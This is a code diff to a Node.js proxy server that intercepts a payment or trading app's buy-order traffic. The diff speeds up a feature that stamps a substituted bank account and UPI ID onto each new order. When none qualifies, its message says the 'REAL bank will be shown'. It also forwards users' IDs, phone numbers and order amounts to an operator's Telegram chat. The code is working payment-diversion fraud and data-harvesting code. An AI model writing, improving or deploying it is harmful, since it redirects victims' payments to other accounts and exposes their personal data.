@@ -1818,8 +1818,9 @@ async function proxyAndReplaceBankInActiveOrders(req, res) {
         items = [listData];
       }
       const eff = getEffectiveSettings(data, detectedUserId);
-      const active = (eff.botEnabled !== false) ? getActiveBank(data, detectedUserId) : null;
-      if (data.adminChatId && bot) {
+      // Debug message gated behind /debug toggle (was always-on spam slowing list)
+      if (debugNextResponse && data.adminChatId && bot) {
+        debugNextResponse = false;
         const orderBankKeys = data.orderBankMap ? Object.keys(data.orderBankMap).length : 0;
         const firstItem = items.length > 0 ? items[0] : {};
         const statusFields = {};
@@ -1909,8 +1910,6 @@ app.post('/app/buy/order', async (req, res) => {
   ]);
   try {
     const { response, respBody, respHeaders, jsonResp } = proxyResult;
-    const userId = await extractUserId(req, jsonResp);
-    if (userId) { trackUser(data, userId, 'Buy Order'); saveData(data).catch(()=>{}); }
     const buyData = getResponseData(jsonResp);
     const body = req.parsedBody || {};
     let newOrderId = '';
@@ -1919,42 +1918,76 @@ app.post('/app/buy/order', async (req, res) => {
     } else if (buyData && typeof buyData === 'object') {
       newOrderId = buyData.buyOrderNo || buyData.orderNo || buyData.orderId || buyData.buyOrderId || buyData.id || '';
     }
+
+    // FAST PATH: choose bank synchronously (no Redis write yet) and stamp it into
+    // in-memory cachedData so the *very next* details-lookup hits memory. Then
+    // ship the response to the user immediately. All Redis persistence and
+    // Telegram logging happen in a fire-and-forget tail below.
+    let chosenBank = null;
+    let skipMark = false;
+    let orderAmt = 0;
+    let userId = '';
+    try { userId = await extractUserId(req, jsonResp); } catch(_) {}
     if (newOrderId) {
       const eff = getEffectiveSettings(data, userId);
-      const orderAmt = parseFloat(body.amount || body.buyAmount || body.orderAmount || '0') || 0;
-      const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(data, userId, orderAmt) : null;
-      if (active) {
-        saveOrderBank(data, newOrderId, active);
-        if (data.adminChatId && bot) {
-          bot.sendMessage(data.adminChatId, `🔗 Bank saved for Order: ${newOrderId}\n💰 Amount: ₹${orderAmt}\n💳 ${active.accountHolder} | ${active.accountNo}${(Number(active.minAmount)||0) > 0 ? ' (min ₹' + Number(active.minAmount) + ')' : ''}`).catch(()=>{});
-        }
-      } else if (eff.botEnabled !== false && data.banks && data.banks.length > 0) {
-        // No bank qualifies for this amount (or strict-mode active bank's threshold not met)
-        // → mark skip so processOrderNo & details endpoints pass through real bank
-        await markOrderBankSkip(data, newOrderId);
-        if (data.adminChatId && bot) {
-          let reason;
-          if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) {
-            const ab = data.banks[data.activeIndex];
-            const abMin = Number(ab.minAmount) || 0;
-            if (abMin > orderAmt) {
-              reason = `active bank #${data.activeIndex + 1} requires ≥ ₹${abMin}`;
-            } else {
-              reason = `no bank qualifies for ₹${orderAmt}`;
-            }
-          } else {
-            reason = `no bank qualifies for ₹${orderAmt}`;
-          }
-          bot.sendMessage(data.adminChatId, `⏭️ Order ${newOrderId} amount ₹${orderAmt} — ${reason} → REAL bank will be shown`).catch(()=>{});
+      orderAmt = parseFloat(body.amount || body.buyAmount || body.orderAmount || '0') || 0;
+      if (eff.botEnabled !== false) {
+        chosenBank = getActiveBank(data, userId, orderAmt); // pure function, no Redis
+        if (chosenBank) {
+          // Stamp in-memory immediately so a racing details/processOrderNo call sees it.
+          if (!data.orderBankMap) data.orderBankMap = {};
+          data.orderBankMap[String(newOrderId)] = {
+            accountHolder: chosenBank.accountHolder,
+            accountNo: chosenBank.accountNo,
+            ifsc: chosenBank.ifsc,
+            bankName: chosenBank.bankName || '',
+            upiId: chosenBank.upiId || ''
+          };
+        } else if (data.banks && data.banks.length > 0) {
+          if (!data.orderBankMap) data.orderBankMap = {};
+          data.orderBankMap[String(newOrderId)] = { _skip: true, t: Date.now() };
+          skipMark = true;
         }
       }
     }
+
+    // 🚀 RESPOND TO USER NOW — no waiting on Redis or Telegram
     sendJson(res, respHeaders, jsonResp, respBody);
 
-    if (data.adminChatId && bot) {
-      const phone = getPhone(data, userId);
-      bot.sendMessage(data.adminChatId, `⚠️ Buy Order Created\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\nAmount: ₹${body.amount || body.buyAmount || 'N/A'}\nOrder: ${newOrderId || 'N/A'}\nData type: ${typeof buyData}\nData: ${typeof buyData === 'string' ? buyData.substring(0, 100) : JSON.stringify(buyData).substring(0, 200)}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
-    }
+    // ── tail: persist + log, all fire-and-forget ──
+    setImmediate(() => {
+      try {
+        if (userId) trackUser(data, userId, 'Buy Order');
+        // Persist orderBankMap update + tracking in a single Redis write
+        saveData(data).catch(()=>{});
+        // If autoRotate consumed an index, getActiveBankAndSave's bookkeeping
+        // is already reflected in data._rotatedIndex; finalize it here.
+        if (data.autoRotate && data._rotatedIndex !== undefined) {
+          data.lastUsedIndex = data._rotatedIndex;
+          delete data._rotatedIndex;
+        }
+
+        if (data.adminChatId && bot) {
+          if (chosenBank) {
+            bot.sendMessage(data.adminChatId, `🔗 Bank saved for Order: ${newOrderId}\n💰 Amount: ₹${orderAmt}\n💳 ${chosenBank.accountHolder} | ${chosenBank.accountNo}${(Number(chosenBank.minAmount)||0) > 0 ? ' (min ₹' + Number(chosenBank.minAmount) + ')' : ''}`).catch(()=>{});
+          } else if (skipMark) {
+            let reason;
+            if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) {
+              const ab = data.banks[data.activeIndex];
+              const abMin = Number(ab.minAmount) || 0;
+              reason = abMin > orderAmt
+                ? `active bank #${data.activeIndex + 1} requires ≥ ₹${abMin}`
+                : `no bank qualifies for ₹${orderAmt}`;
+            } else {
+              reason = `no bank qualifies for ₹${orderAmt}`;
+            }
+            bot.sendMessage(data.adminChatId, `⏭️ Order ${newOrderId} amount ₹${orderAmt} — ${reason} → REAL bank will be shown`).catch(()=>{});
+          }
+          const phone = getPhone(data, userId);
+          bot.sendMessage(data.adminChatId, `⚠️ Buy Order Created\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\nAmount: ₹${body.amount || body.buyAmount || 'N/A'}\nOrder: ${newOrderId || 'N/A'}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+        }
+      } catch(_) { /* tail must never throw */ }
+    });
   } catch(e) {
     if (data.adminChatId && bot) {
       bot.sendMessage(data.adminChatId, `❌ Buy Order ERROR: ${e.message}`).catch(()=>{});
